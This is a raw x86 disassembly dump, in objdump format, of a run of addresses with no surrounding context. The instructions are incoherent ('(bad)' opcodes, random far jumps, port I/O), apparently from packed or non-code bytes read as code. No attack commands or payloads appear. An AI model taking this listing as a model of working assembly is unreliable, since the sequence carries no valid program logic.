  41d9b7:	and    bh,BYTE PTR [edx-0x66826772]
  41d9bd:	adc    edi,DWORD PTR [ecx]
  41d9bf:	mul    BYTE PTR [ebp-0x683eddc7]
  41d9c5:	mov    ds:0x3b9506ca,eax
  41d9ca:	adc    bh,BYTE PTR [edi-0xde6b8b6]
  41d9d0:	es cdq 
  41d9d2:	lods   eax,DWORD PTR ds:[esi]
  41d9d3:	jb     0x41d9bc
  41d9d5:	mov    esp,0x38d8aea6
  41d9da:	(bad)
  41d9dd:	in     eax,0xd8
  41d9df:	icebp  
  41d9e0:	ins    BYTE PTR es:[edi],dx
  41d9e1:	cwde   
  41d9e2:	mov    dh,0x5f
  41d9e4:	pop    esp
  41d9e5:	jmp    edi
  41d9e7:	mov    WORD PTR [ebx+0x1ac915ed],gs
  41d9ed:	add    DWORD PTR ds:[ebp+0x17],edx
  41d9f1:	retf   0xd35e
  41d9f4:	cmc    
  41d9f5:	shl    BYTE PTR [esi-0x55],1
  41d9f8:	into   
  41d9f9:	cdq    
  41d9fa:	adc    bh,ah
  41d9fc:	sub    BYTE PTR [edi+0x48],dl
  41d9ff:	aad    0x11
  41da01:	push   esp
  41da02:	cld    
  41da03:	minps  xmm1,XMMWORD PTR [edx]
  41da06:	pop    edx
  41da07:	mov    edx,0x203c91d9
  41da0c:	inc    ebp
  41da0d:	(bad)  
  41da0e:	shl    BYTE PTR [bx+di-0x73],1
  41da12:	mov    bh,0x4a
  41da14:	mov    BYTE PTR [edi+0x25],bh
  41da17:	xchg   BYTE PTR [esi-0x65a834f1],ah
  41da1d:	push   eax
  41da1e:	pop    esi
  41da1f:	sbb    edx,ecx
  41da21:	cmp    al,0x3f
  41da23:	mov    ecx,0xc1135b8c
  41da28:	fsub   QWORD PTR [esi+0x75]
  41da2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da2c:	je     0x41daa5
  41da2e:	ret    0xad4f
  41da31:	aad    0x1f
  41da33:	push   edi
  41da34:	sub    eax,0xe487ac1
  41da39:	imul   ebx,DWORD PTR [edi],0xffffff92
  41da3c:	inc    edx
  41da3d:	xchg   esi,eax
  41da3e:	add    DWORD PTR [edx],0x61
  41da41:	mov    ecx,0x729a5b8d
  41da46:	lea    edx,[esi]
  41da48:	mov    dl,ch
  41da4a:	test   al,0xfd
  41da4c:	inc    esi
  41da4d:	gs pop edx
  41da4f:	mov    bl,0x4d
  41da51:	xchg   ebx,eax
  41da52:	jmp    0x41da50
  41da54:	push   cs
  41da55:	fsub   DWORD PTR [ecx-0xd6add6d]
  41da5b:	fs jmp 0x2364:0x8f5a9bd6
  41da63:	popf   
  41da64:	ret    0x71cb
  41da67:	xor    al,0x88
  41da69:	push   eax
  41da6a:	stc    
  41da6b:	xor    cl,BYTE PTR [edi-0x7098fe31]
  41da71:	push   eax
  41da72:	lock jle 0x41daaa
  41da75:	jg     0x41dab6
  41da77:	mov    eax,ds:0x601293f5
  41da7c:	jle    0x41da12
  41da7e:	sbb    ch,BYTE PTR [edx]
  41da80:	and    DWORD PTR [ecx-0xd237514],ebp
  41da86:	loop   0x41da75
  41da88:	hlt    
  41da89:	sub    ah,bl
  41da8b:	inc    ebx
  41da8c:	(bad)  
  41da8d:	xor    DWORD PTR [ebx+edx*2],ebp
  41da90:	ds push esi
  41da92:	ret    0x69e2
  41da95:	or     eax,0x39db6559
  41da9a:	and    DWORD PTR [esi+0x33],edx
  41da9d:	cmp    BYTE PTR [eax],bh
  41da9f:	call   0x1713:0xea9c42a2
  41daa6:	in     eax,0x83
  41daa8:	enter  0x9c66,0x3f
  41daac:	xor    BYTE PTR [edx+0x78eb86be],dl
  41dab2:	xor    DWORD PTR [edi-0x52],esp
  41dab5:	xchg   ebx,eax
  41dab6:	mov    ah,0xa4
  41dab8:	and    ah,BYTE PTR [edx+0x46]
  41dabb:	jmp    0x41dac0
  41dabd:	mov    bh,dl
  41dabf:	lahf   
  41dac0:	imul   ecx,DWORD PTR [ebx],0x5b83288c
  41dac6:	ds xchg ebp,eax
  41dac8:	xchg   DWORD PTR [eax+edi*4-0x2b7454f2],eax
  41dacf:	mov    dl,0x5e
  41dad1:	inc    edx
  41dad2:	or     edx,DWORD PTR [ebx-0x53]
  41dad5:	sbb    eax,0x5d228d65
  41dada:	shl    BYTE PTR [ebx-0x1fa96d92],1
  41dae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dae1:	mov    ds,WORD PTR [edx]
  41dae3:	mov    eax,0xd73e442d
  41dae8:	das    
  41dae9:	jae    0x41da9d
  41daeb:	enter  0xa1f9,0xf0
  41daef:	loope  0x41da93
  41daf1:	dec    ebp
  41daf2:	(bad)  
  41daf3:	out    dx,al
  41daf4:	enter  0x4254,0xda
  41daf8:	xchg   ebx,eax
  41daf9:	(bad)  
  41dafa:	aaa    
  41dafb:	pop    ss
  41dafc:	mov    dl,0x83
  41dafe:	test   BYTE PTR gs:[ebx-0x8],ah
  41db02:	push   esp
  41db03:	jno    0x41dab9
  41db05:	push   ecx
  41db06:	std    
  41db07:	cmp    al,0xcc
  41db09:	cmp    eax,DWORD PTR [edi+esi*1-0x3f]
  41db0d:	or     ebx,esi
  41db0f:	fwait
  41db10:	jmp    0x41db2d
  41db12:	stc    
  41db13:	scas   eax,DWORD PTR es:[edi]
  41db14:	in     al,0x11
  41db16:	lahf   
  41db17:	sbb    BYTE PTR [eax-0xc],cl
  41db1a:	pop    es
  41db1b:	mov    ebx,0x8e0c06cf
  41db20:	test   DWORD PTR [ebp+0xdc8830e],ebx
  41db26:	jo     0x41daba
  41db28:	pop    ebp
  41db29:	jmp    0xeced6a0f
  41db2e:	xor    cl,ch
  41db30:	mov    ebx,0x634a4008
  41db35:	popa   
  41db36:	dec    edi
  41db37:	into   
  41db38:	add    DWORD PTR [ebp-0x49b5f2bd],ebp
  41db3e:	mov    ds:0xef26cfdb,eax
  41db43:	sub    al,0x67
  41db45:	daa    
  41db46:	push   edx
  41db47:	lock lahf 
  41db49:	pop    esp
  41db4a:	lock bound ecx,QWORD PTR [ebx-0x731a031e]
  41db51:	mov    ecx,0x3748e5bb
  41db56:	das    
  41db57:	jbe    0x41db15
  41db59:	sub    ecx,DWORD PTR [ecx-0x38]
  41db5c:	xor    ah,bh
  41db5e:	int    0x6f
  41db60:	(bad)  
  41db61:	scas   al,BYTE PTR es:[edi]
  41db62:	test   DWORD PTR [eax+eax*1+0x0],edi
	...
  41db71:	inc    ecx
  41db72:	out    dx,eax
  41db73:	jnp    0x41dba3
  41db75:	(bad)  
  41db76:	mov    esi,0x1adaef55
  41db7b:	cmp    eax,0xfdb44c62
  41db80:	xlat   BYTE PTR ds:[ebx]
  41db81:	adc    eax,0xab000157
  41db86:	add    eax,DWORD PTR [eax]
  41db88:	add    BYTE PTR [eax+0x17],ch
  41db8b:	aad    0xc5
  41db8d:	dec    ebp
  41db8e:	or     al,0x1
  41db90:	cwde   
  41db91:	(bad)  
  41db92:	sbb    ebx,esi
  41db94:	std    
  41db95:	stos   DWORD PTR es:[edi],eax
  41db96:	push   0x7d
  41db98:	in     eax,dx
  41db99:	sbb    eax,0xd831320d
  41db9e:	fimul  DWORD PTR [ebp-0x2952c55a]
  41dba4:	push   cs
  41dba5:	or     DWORD PTR [ecx+0x48],ebp
  41dba8:	test   BYTE PTR [esi+0x41f759ce],bh
  41dbae:	pop    edi
  41dbaf:	shr    DWORD PTR [ecx],cl
  41dbb1:	into   
  41dbb2:	(bad)  
  41dbb3:	call   0x2cbb:0xd3565a8b
  41dbba:	out    dx,eax
  41dbbb:	xor    eax,0x92aa6d75
  41dbc0:	out    0xc,al
  41dbc2:	(bad)  
  41dbc3:	gs nop
  41dbc5:	mov    al,0x36
  41dbc7:	mov    esi,0x1fe57f89
  41dbcc:	mov    ebx,edi
  41dbce:	or     BYTE PTR [edx+0x666953c],ah
  41dbd4:	fistp  DWORD PTR es:[edi+0x2b7229d2]
  41dbdb:	pop    eax
  41dbdc:	sbb    eax,0xd9305592
  41dbe1:	push   eax
  41dbe2:	daa    
  41dbe3:	cmp    eax,edi
  41dbe5:	and    si,WORD PTR [edx]
  41dbe8:	(bad)  
  41dbea:	push   ss
  41dbeb:	push   ebx
  41dbec:	jmp    0x6a21:0x273f3b74
  41dbf3:	mov    eax,ds:0xdd06f9f
  41dbf8:	sub    ebx,DWORD PTR [ebp+0x4551165]
  41dbfe:	xchg   edi,eax
  41dbff:	das    
  41dc00:	jmp    0x41dc27
  41dc02:	xor    eax,0xa620bdc3
  41dc07:	mov    ebp,0x20e0ecd9
  41dc0c:	data16 fstp QWORD PTR ds:0xbc501d4d
  41dc13:	sub    ebp,DWORD PTR [eax-0x11]
  41dc16:	xor    DWORD PTR [ebx],edx
  41dc18:	mov    ah,BYTE PTR [ebx+0x4f]
  41dc1b:	cmc    
  41dc1c:	rcr    BYTE PTR [ecx+0x21],cl
  41dc1f:	lods   al,BYTE PTR ds:[esi]
  41dc20:	imul   esi,DWORD PTR [ecx-0x3d325bb7],0xb
  41dc27:	add    al,0x19
  41dc29:	pop    ebp
  41dc2a:	div    BYTE PTR [ecx]
  41dc2c:	in     al,0xb9
  41dc2e:	(bad)  
  41dc2f:	arpl   dx,si
  41dc31:	add    eax,0x16cf8c4
  41dc36:	je     0x41dbf5
  41dc38:	jle    0x41dc9c
  41dc3a:	cli    
  41dc3b:	pop    edx
  41dc3c:	and    dl,bh
  41dc3e:	sub    esp,DWORD PTR [edi-0xd]
  41dc41:	add    DWORD PTR es:[ebp-0x32],esi
  41dc45:	jp     0x41dca3
  41dc47:	xlat   BYTE PTR ds:[ebx]
  41dc48:	mov    eax,0xf4786a74
  41dc4d:	es jbe 0x41dccd
  41dc50:	ins    DWORD PTR es:[edi],dx
  41dc51:	push   ss
  41dc52:	mov    ch,0x54
  41dc54:	adc    esp,edi
  41dc56:	ins    BYTE PTR es:[edi],dx
  41dc57:	xchg   esp,eax
  41dc58:	cwde   
  41dc59:	inc    ebx
  41dc5a:	(bad)  
  41dc5b:	cmc    
  41dc5c:	dec    ebp
  41dc5d:	ret    
  41dc5e:	stc    
  41dc5f:	jge    0x41dc5a
  41dc61:	scas   al,BYTE PTR es:[edi]
  41dc62:	mov    DWORD PTR [esi-0x6e4dbebf],esp
  41dc68:	std    
  41dc69:	sbb    BYTE PTR [ebx+0x66017bb4],cl
  41dc6f:	jl     0x41dcd3
  41dc71:	mov    dl,0xd3
  41dc73:	fwait
  41dc74:	popa   
  41dc75:	push   0xd
  41dc77:	(bad)  
  41dc78:	bound  ecx,QWORD PTR [edx-0xb3a158]
  41dc7e:	add    BYTE PTR [ebp+0x34d7fcf],bl
  41dc84:	add    BYTE PTR [edi+eax*2-0x64],dl
  41dc88:	sbb    ecx,eax
  41dc8a:	adc    BYTE PTR [ecx+0x45],bl
  41dc8d:	pop    edx
  41dc8e:	push   ebp
  41dc8f:	je     0x41dcea
  41dc91:	rcr    BYTE PTR [edx-0x69],cl
  41dc94:	dec    eax
  41dc95:	neg    DWORD PTR [ecx]
  41dc97:	and    eax,DWORD PTR [eax+0x4b]
  41dc9a:	xor    edx,DWORD PTR [edi]
  41dc9c:	mov    esp,DWORD PTR [eax+0x53]
  41dc9f:	mov    edi,ecx
  41dca1:	leave  
  41dca2:	shl    BYTE PTR ds:0xe9389860,0x52
  41dca9:	xchg   ebp,eax
  41dcaa:	jecxz  0x41dcd9
  41dcac:	rcr    DWORD PTR [ecx+0x13],1
  41dcaf:	mov    cl,cl
  41dcb1:	dec    ecx
  41dcb2:	in     eax,0xf6
  41dcb4:	dec    edi
  41dcb5:	xchg   cl,ah
  41dcb7:	rcl    DWORD PTR [eax+ebp*2+0x2e],1
  41dcbb:	pop    DWORD PTR [ecx+0x1045ac7b]
  41dcc1:	outs   dx,BYTE PTR ds:[esi]
  41dcc2:	cmp    ebp,edx
  41dcc4:	sub    ah,BYTE PTR ds:0x245d9a1c
  41dcca:	pop    ss
  41dccb:	push   ebp
  41dccc:	mov    ah,0x15
  41dcce:	mov    DWORD PTR ss:[ecx],ecx
  41dcd1:	xchg   ebp,eax
  41dcd2:	outs   dx,BYTE PTR ds:[esi]
  41dcd3:	mov    dh,BYTE PTR [ebp-0x1]
  41dcd6:	adc    al,0xef
  41dcd8:	mov    ds:0xe9396ea0,al
  41dcdd:	fsubr  st(6),st
  41dcdf:	int    0xb1
  41dce1:	imul   edx,esi,0x3d
  41dce4:	and    DWORD PTR [esi-0x3bf8b571],ecx
  41dcea:	xor    eax,0x71f85db9
  41dcef:	and    eax,0x145df224
  41dcf4:	arpl   WORD PTR [ecx],si
  41dcf6:	lds    edi,FWORD PTR [edi]
  41dcf8:	jmp    0x684e:0xb2f0196e
  41dcff:	push   ss
  41dd00:	mov    ch,0xf
  41dd02:	cs xchg ebx,eax
  41dd04:	sbb    esi,eax
  41dd06:	lock add BYTE PTR [ebx+0x3b],al
  41dd0a:	ficom  WORD PTR [eax+0x58]
  41dd0d:	(bad)  
  41dd0e:	out    dx,al
  41dd0f:	pop    eax
  41dd10:	addr16 (bad) 
  41dd12:	cdq    
  41dd13:	sbb    ebx,ecx
  41dd15:	pop    esp
  41dd16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd17:	or     eax,0xa943e1c3
  41dd1c:	mov    esi,0x4bb99cd3
  41dd21:	adc    al,0x3e
  41dd23:	ja     0x41dd85
  41dd25:	jnp    0x41dd97
  41dd27:	add    edx,eax
  41dd29:	xchg   esp,eax
  41dd2a:	pop    edx
  41dd2b:	fcmovu st,st(1)
  41dd2d:	xchg   ebx,eax
  41dd2e:	rol    ebx,0xa2
  41dd31:	(bad)  
  41dd32:	std    
  41dd33:	out    0x80,eax
  41dd35:	cmp    ecx,DWORD PTR [ecx-0x5b]
  41dd38:	pusha  
  41dd39:	add    eax,0xd1001f4f
  41dd3e:	jnp    0x41dcd3
  41dd40:	retf   0x8c98
  41dd43:	imul   ebx,DWORD PTR [edx+0x69],0xe30dcf12
  41dd4a:	or     dh,BYTE PTR [ebp+0x55c62923]
  41dd50:	mov    BYTE PTR [ebp-0x3f],0x2e
  41dd54:	adc    bh,BYTE PTR [esi-0x262d7b5d]
  41dd5a:	imul   esp,ecx,0x4de33150
  41dd60:	ins    DWORD PTR es:[edi],dx
  41dd61:	mov    eax,DWORD PTR [ecx]
  41dd63:	ds dec esi
  41dd65:	push   ebx
  41dd66:	in     al,dx
  41dd67:	arpl   bp,si
  41dd69:	dec    edi
  41dd6a:	push   edx
  41dd6b:	sbb    eax,0xfad255e2
  41dd70:	mov    bh,0x28
  41dd72:	push   0xffffff84
  41dd74:	and    cl,0x8
  41dd77:	and    ecx,DWORD PTR [edi]
  41dd79:	sbb    DWORD PTR [edx-0x42afecf9],0xcbae28ad
  41dd83:	mov    edx,0x600ae577
  41dd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd89:	out    0x96,eax
  41dd8b:	jns    0x41dd2a
  41dd8d:	cli    
  41dd8e:	test   edi,esi
  41dd90:	or     DWORD PTR [edx],esi
  41dd92:	ds es mov cl,0x22
  41dd96:	mov    BYTE PTR ds:0xd6fa581,bl
  41dd9c:	popf   
  41dd9d:	scas   al,BYTE PTR es:[edi]
  41dd9e:	ja     0x41dd65
  41dda0:	cmp    al,0x2b
  41dda2:	dec    ecx
  41dda3:	sub    al,0xfc
  41dda5:	mov    esi,0xa03114bc
  41ddaa:	add    BYTE PTR [edi],al
  41ddac:	push   ebx
  41ddad:	stc    
  41ddae:	dec    ebx
  41ddaf:	pop    ecx
  41ddb0:	pop    esp
  41ddb1:	and    eax,0x8f4562df
  41ddb6:	and    bh,BYTE PTR [ebp+0x51d9f911]
  41ddbc:	xchg   BYTE PTR [ebp+0x4],bh
  41ddbf:	mov    eax,ds:0xab6b6b21
  41ddc4:	shl    DWORD PTR [ecx-0x72],0x30
  41ddc8:	dec    eax
  41ddc9:	fsubp  st(1),st
  41ddcb:	mov    ch,0x81
  41ddcd:	and    eax,0x1fbd0eb7
  41ddd2:	xchg   ebx,eax
  41ddd3:	(bad)  
  41ddd4:	rcl    esi,cl
  41ddd6:	lods   al,BYTE PTR ds:[esi]
  41ddd7:	xlat   BYTE PTR ds:[ebx]
  41ddd8:	adc    ebx,edi
  41ddda:	jb     0x41dd9e
  41dddc:	ficom  WORD PTR [ecx+ecx*4+0x696104f8]
  41dde3:	pusha  
  41dde4:	fcom   DWORD PTR [ebp+0x1a17fc4c]
  41ddea:	mov    al,ds:0xe7d752c6
  41ddef:	out    dx,eax
  41ddf0:	ins    BYTE PTR es:[edi],dx
  41ddf1:	test   BYTE PTR [ebp-0x3d9182e3],0xf9
  41ddf8:	js     0x41ddbf
  41ddfa:	stos   BYTE PTR es:[edi],al
  41ddfb:	popa   
  41ddfc:	in     al,dx
  41ddfd:	mov    ?,WORD PTR [ebp-0x787825e2]
  41de03:	sub    ch,BYTE PTR [ecx]
  41de05:	out    dx,eax
  41de06:	dec    esp
  41de07:	fcomip st,st(2)
  41de09:	(bad)  
  41de0a:	push   edi
  41de0b:	jns    0x41ddfe
  41de0d:	ror    DWORD PTR [ebp-0x2a],0x87
  41de11:	add    ebp,edx
  41de13:	(bad)  
  41de14:	fidivr WORD PTR [esi+0x23a6b643]
  41de1a:	push   cs
  41de1b:	xchg   BYTE PTR [edi+0x5d453e80],dh
  41de21:	je     0x41de72
  41de23:	jne    0x41de76
  41de25:	daa    
  41de26:	mov    edx,0x28677fdd
  41de2b:	dec    edx
  41de2c:	cmp    al,0xc9
  41de2e:	mov    al,0x1a
  41de30:	xor    bl,BYTE PTR [ecx]
  41de32:	popf   
  41de33:	sbb    bl,BYTE PTR [ecx+0x48]
  41de36:	aam    0x9e
  41de38:	call   0xef2d:0x4ee8307
  41de3f:	xor    edi,0xbae92235
  41de45:	in     al,0xd
  41de47:	dec    ebx
  41de48:	mov    ah,0x2a
  41de4a:	add    eax,0x4f9169f0
  41de4f:	enter  0x8b08,0xad
  41de53:	add    ah,bh
  41de55:	xchg   BYTE PTR [ebp+ebx*1-0x24],ah
  41de59:	sub    ecx,DWORD PTR [ecx]
  41de5b:	mov    ecx,0x2b708bc5
  41de60:	dec    ebp
  41de61:	pop    es
  41de62:	sbb    al,0x45
  41de64:	xchg   esi,ebp
  41de66:	xchg   ecx,eax
  41de67:	addr16 stc 
  41de69:	retf   
  41de6a:	fist   DWORD PTR [ebp+0x1a8ef5c0]
  41de70:	cmp    ebx,DWORD PTR [edi+ecx*2+0x61]
  41de74:	(bad)  
  41de75:	jmp    0xf54b1635
  41de7a:	fisubr DWORD PTR [ecx+edx*2+0x1d]
  41de7e:	xor    DWORD PTR [ecx+0x3378af37],esp
  41de84:	and    DWORD PTR [edi],esp
  41de86:	push   ebx
  41de87:	cmp    al,0x8a
  41de89:	cld    
  41de8a:	pop    edi
  41de8b:	push   ebp
  41de8c:	xlat   BYTE PTR ds:[ebx]
  41de8d:	stos   DWORD PTR es:[edi],eax
  41de8e:	inc    ecx
  41de8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de90:	add    cl,BYTE PTR [ebp-0x24]
  41de93:	test   BYTE PTR [ecx+0x64559984],ah
  41de99:	jge    0x41de4f
  41de9b:	int3   
  41de9c:	(bad)  
  41de9d:	ja     0x41de90
  41de9f:	or     ebp,0x877f7070
  41dea5:	or     eax,0xe3e8643
  41deaa:	xor    DWORD PTR [esi-0xd1e6445],edi
  41deb0:	fucomi st,st(2)
  41deb2:	jnp    0x41df12
  41deb4:	xchg   edi,eax
  41deb5:	sbb    ch,dl
  41deb7:	jg     0x41de53
  41deb9:	xor    BYTE PTR [edx+ecx*8+0x5ab08e50],0xe8
  41dec1:	je     0x41de4f
  41dec3:	jmp    0x41de9d
  41dec5:	cmp    BYTE PTR [ecx-0x1e17682b],bl
  41decb:	cwde   
  41decc:	imul   ecx,DWORD PTR [edx-0x495a0821],0xb6e0a599
  41ded6:	mov    bh,al
  41ded8:	jne    0x41ded8
  41deda:	nop
  41dedb:	in     eax,0x73
  41dedd:	mov    edx,0xa89c1a9a
  41dee2:	mov    eax,DWORD PTR [eax]
  41dee4:	imul   esi,esp,0xffffffd7
  41dee7:	ret    0x2295
  41deea:	adc    eax,0x3f6c0774
  41deef:	out    dx,eax
  41def0:	lods   al,BYTE PTR ds:[esi]
  41def1:	jg     0x41deb4
  41def3:	aad    0xc0
  41def5:	repz inc ebp
  41def7:	int3   
  41def8:	xchg   DWORD PTR [ebx-0x5f],eax
  41defb:	shl    cl,0xa5
  41defe:	ret    0xd83a
  41df01:	push   ecx
  41df02:	scas   eax,DWORD PTR es:[edi]
  41df03:	and    eax,0x1ae39a64
  41df08:	xchg   DWORD PTR [ecx-0x6],esi
  41df0b:	ds cmp eax,0x8cd093b6
  41df11:	cmp    ch,cl
  41df13:	sub    ebp,esp
  41df15:	(bad)  
  41df17:	dec    esi
  41df18:	jmp    0x41df7b
  41df1a:	mov    esi,0xb218bcb2
  41df1f:	dec    ecx
  41df20:	push   eax
  41df21:	sub    edx,esi
  41df23:	(bad)  
  41df24:	(bad)  
  41df25:	push   ebp
  41df26:	stos   DWORD PTR es:[edi],eax
  41df27:	call   0xbb15:0xe6289c4e
  41df2e:	cld    
  41df2f:	pop    ecx
  41df30:	cmp    DWORD PTR [eax+0x3e3c],esp
	...
  41df3e:	add    BYTE PTR [eax],al
  41df40:	add    BYTE PTR ds:0x7f7d7f79,dl
  41df46:	jg     0x41df5f
  41df48:	jns    0x41df1b
  41df4a:	pop    cx
  41df4c:	or     bl,0xda
  41df4f:	dec    ecx
  41df50:	ins    BYTE PTR es:[edi],dx
  41df51:	rcr    BYTE PTR [edx+0x1],0x0
  41df55:	stos   DWORD PTR es:[edi],eax
  41df56:	add    eax,DWORD PTR [eax]
  41df58:	add    BYTE PTR [ebp+0x2f7cad57],dl
  41df5e:	icebp  
  41df5f:	xchg   al,ch
  41df61:	pop    esi
  41df62:	push   esi
  41df63:	ret    
  41df64:	jo     0x41df3a
  41df66:	out    dx,al
  41df67:	xor    ebx,DWORD PTR [ecx+0x2a]
  41df6a:	jo     0x41df21
  41df6c:	into   
  41df6d:	adc    edi,DWORD PTR [ecx-0x2d7a34c1]
  41df73:	mov    dl,0xf9
  41df75:	loop   0x41df35
  41df77:	ret    
  41df78:	lea    eax,[ebx]
  41df7a:	je     0x41df81
  41df7c:	fidivr DWORD PTR [edx]
  41df7e:	xchg   bl,cl
  41df80:	sub    bl,BYTE PTR [esi]
  41df82:	inc    eax
  41df83:	outs   dx,DWORD PTR ds:[esi]
  41df84:	mov    BYTE PTR [edx],bl
  41df86:	mov    ds:0xbfcd61a7,al
  41df8b:	stos   DWORD PTR es:[edi],eax
  41df8c:	xlat   BYTE PTR ds:[ebx]
  41df8d:	retf   0x51d9
  41df90:	lods   eax,DWORD PTR ds:[esi]
  41df91:	es cld 
  41df93:	pop    edi
  41df94:	pop    esi
  41df95:	(bad)  
  41df96:	jle    0x41df1b
  41df98:	add    BYTE PTR [ecx+0x2],ch
  41df9b:	adc    al,0xb4
  41df9d:	pop    ebp
  41df9e:	inc    edi
  41df9f:	sar    BYTE PTR [eax-0x21],cl
  41dfa2:	mov    edi,0x17e0b918
  41dfa7:	xchg   ecx,eax
  41dfa8:	sub    eax,0x32868b7f
  41dfad:	fidiv  DWORD PTR [ebx+eax*8+0x5f27785f]
  41dfb4:	lds    ebx,FWORD PTR [edx]
  41dfb6:	cmp    ebp,ebp
  41dfb8:	pusha  
  41dfb9:	dec    esp
  41dfba:	inc    edx
  41dfbb:	pop    es
  41dfbc:	popf   
  41dfbd:	in     eax,dx
  41dfbe:	into   
  41dfbf:	ja     0x41e01b
  41dfc1:	cmp    DWORD PTR [ecx+0x1],ebp
  41dfc4:	xor    ch,BYTE PTR [edx]
  41dfc6:	aam    0xe0
  41dfc8:	or     BYTE PTR [ecx+0x4c],bl
  41dfcb:	inc    esi
  41dfcc:	imul   ebx,DWORD PTR [ecx+ebx*4+0x68],0x40714f61
  41dfd4:	mov    edx,0x54fc7c7e
  41dfd9:	ret    
  41dfda:	xor    eax,0x1c0632d9
  41dfdf:	bound  eax,QWORD PTR [edx]
  41dfe1:	mov    ?,WORD PTR [ebx]
  41dfe3:	or     eax,0x4a941306
  41dfe8:	sbb    eax,0x6ce8464a
  41dfed:	js     0x41dfd7
  41dfef:	imul   DWORD PTR ds:0x83d8be46
  41dff5:	dec    esi
  41dff6:	loop   0x41dfd0
  41dff8:	repz test al,0xce
  41dffb:	fidivr WORD PTR [ecx+0x125e02d4]
  41e001:	sub    eax,DWORD PTR [edx]
  41e003:	rol    BYTE PTR [edi+ebp*8-0x17],0x4e
  41e008:	jp     0x41e03a
  41e00a:	xor    al,0xe7
  41e00c:	mov    bh,0x34
  41e00e:	or     edx,DWORD PTR gs:[ebx-0x26e73190]
  41e015:	call   0x1628:0x86e8a3df
  41e01c:	lods   al,BYTE PTR ss:[esi]
  41e01e:	adc    ah,dl
  41e020:	sub    eax,0x1d1e7e05
  41e025:	les    eax,FWORD PTR ds:0x995a3062
  41e02b:	mov    es,WORD PTR [ebp-0x5]
  41e02e:	in     eax,0x7a
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	xlat   BYTE PTR ds:[ebx]
  41e032:	dec    esp
  41e033:	jne    0x41e01d
  41e035:	push   es
  41e036:	popa   
  41e037:	xchg   esp,eax
  41e038:	jmp    0x6175:0xad9c03cd
  41e03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e040:	cmp    dh,BYTE PTR [edi]
  41e042:	or     ah,BYTE PTR [esi]
  41e044:	push   cs
  41e045:	js     0x41dffe
  41e047:	xchg   ebp,eax
  41e048:	and    ch,BYTE PTR es:[esp+esi*4]
  41e04c:	add    al,0x46
  41e04e:	aas    
  41e04f:	sub    al,bh
  41e051:	test   DWORD PTR [esi+edi*2+0x4ba05d80],0xe8dccd9f
  41e05c:	(bad)  
  41e05d:	out    dx,al
  41e05e:	retf   
  41e05f:	dec    edx
  41e060:	cmp    DWORD PTR [edi],esi
  41e062:	aas    
  41e063:	jbe    0x41e013
  41e065:	dec    ebx
  41e066:	retf   
  41e067:	shl    DWORD PTR [edx],cl
  41e069:	fcom   DWORD PTR ds:0xb9a13c42
  41e06f:	ds dec esp
  41e071:	inc    esi
  41e072:	push   esp
  41e073:	sbb    BYTE PTR [esi+0x5930853e],al
  41e079:	bound  eax,QWORD PTR [esi]
  41e07b:	ja     0x41e01e
  41e07d:	mov    ds:0x3d631465,eax
  41e082:	ins    BYTE PTR es:[edi],dx
  41e083:	xor    ecx,DWORD PTR [ebx-0x4d]
  41e086:	cmc    
  41e087:	rcr    DWORD PTR [ecx+0x72],cl
  41e08a:	sub    BYTE PTR [edx],0xa
  41e08d:	sbb    esi,DWORD PTR [esi]
  41e08f:	adc    al,0x7b
  41e091:	dec    ebx
  41e092:	mov    dl,0xa5
  41e094:	and    cl,0xe1
  41e097:	mov    ecx,0x5288d304
  41e09c:	aad    0xdb
  41e09e:	not    DWORD PTR [esi]
  41e0a0:	push   0xc4d6bae5
  41e0a5:	xchg   edx,eax
  41e0a6:	aas    
  41e0a7:	xor    DWORD PTR [edx],eax
  41e0a9:	test   DWORD PTR [eax],esi
  41e0ab:	jmp    0x9d91:0x6c8490fd
  41e0b2:	(bad)  
  41e0b3:	adc    ebx,esp
  41e0b5:	xor    bh,BYTE PTR [eax+0x36]
  41e0b8:	pop    bp
  41e0ba:	xchg   ebp,eax
  41e0bb:	ss pop ecx
  41e0bd:	push   0x85e7b1c6
  41e0c2:	cmp    BYTE PTR [ebx-0x362c9d1b],cl
  41e0c8:	out    dx,al
  41e0c9:	stos   BYTE PTR es:[edi],al
  41e0ca:	sbb    ah,BYTE PTR [eax+0x7c]
  41e0cd:	add    ebx,DWORD PTR [eax-0x7e]
  41e0d0:	adc    edx,edi
  41e0d2:	es dec ebx
  41e0d4:	xchg   edx,eax
  41e0d5:	adc    BYTE PTR [eax],dl
  41e0d7:	or     al,BYTE PTR [edx-0x46cce343]
  41e0dd:	shr    BYTE PTR [edx-0x249947ba],0xd9
  41e0e4:	ja     0x41e0bb
  41e0e6:	inc    edx
  41e0e7:	dec    eax
  41e0e8:	mov    eax,ds:0xaed8170f
  41e0ed:	lock dec ecx
  41e0ef:	mov    al,ds:0xbc56f1f7
  41e0f4:	dec    ebx
  41e0f5:	sbb    eax,0xbc8faa38
  41e0fa:	and    ebx,DWORD PTR [ebx-0x37]
  41e0fd:	mov    ebx,esp
  41e0ff:	pop    ebp
  41e100:	push   ebx
  41e101:	mov    eax,ds:0xfce6ded3
  41e106:	lahf   
  41e107:	data16 aaa 
  41e109:	fist   DWORD PTR [esi+0x2f]
  41e10c:	outs   dx,BYTE PTR ds:[esi]
  41e10d:	adc    al,0x7
  41e10f:	cwde   
  41e110:	mov    es,WORD PTR [ebx-0x16]
  41e113:	mov    ds:0xa767357b,al
  41e118:	sahf   
  41e119:	cdq    
  41e11a:	jg     0x41e0cc
  41e11c:	loope  0x41e177
  41e11e:	retf   0x690d
  41e121:	inc    eax
  41e122:	icebp  
  41e123:	cli    
  41e124:	pop    eax
  41e125:	stc    
  41e126:	sbb    BYTE PTR [edx-0x73],0x9d
  41e12a:	pop    ebp
  41e12b:	stos   BYTE PTR es:[edi],al
  41e12c:	out    0xf0,al
  41e12e:	adc    DWORD PTR [edi+0x44],0xb6513cc2
  41e135:	jo     0x41e1af
  41e137:	inc    ecx
  41e138:	int    0x9b
  41e13a:	cmc    
  41e13b:	jo     0x41e0e2
  41e13d:	mov    al,ds:0x322986df
  41e142:	sub    eax,0xb1b93476
  41e147:	popa   
  41e148:	mul    DWORD PTR [di-0x79c0]
  41e14d:	daa    
